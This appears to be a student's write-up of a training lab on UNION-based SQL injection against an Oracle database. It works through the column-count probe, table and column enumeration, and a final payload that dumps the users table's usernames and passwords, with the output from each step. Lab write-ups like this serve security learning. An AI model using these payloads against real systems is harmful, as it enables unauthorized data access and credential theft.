 This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, 
then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

Hint: 
On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual

For more information, see our SQL injection cheat sheet.

End Goal:
- Determine wich table contains the usernames and passwords
- Determine the column names in table
- Output the content of the table
- Log in as the administrator user

Analysis:
---------

1) Determine the number of columns
' order by 3-- => internal server error

3-1=2

2) Find data type of columns
' UNION select 'a', 'a' from DUAL--
- Oracle Database
- both columns accept type text

3) Output the list of tables in the database
' UNION select table_name, NULL from all_tables--

USERS_PYOLRM

4) Output the column names of the users table

' UNION select column_name, NULL from all_tab_columns where table_name='USERS_PYOLRM'--

USERNAME_ZUEXAB
PASSWORD_WTSEZU

5) Output the list of usernames and passwords

' UNION select USERNAME_ZUEXAB, PASSWORD_WTSEZU from USERS_PYOLRM--
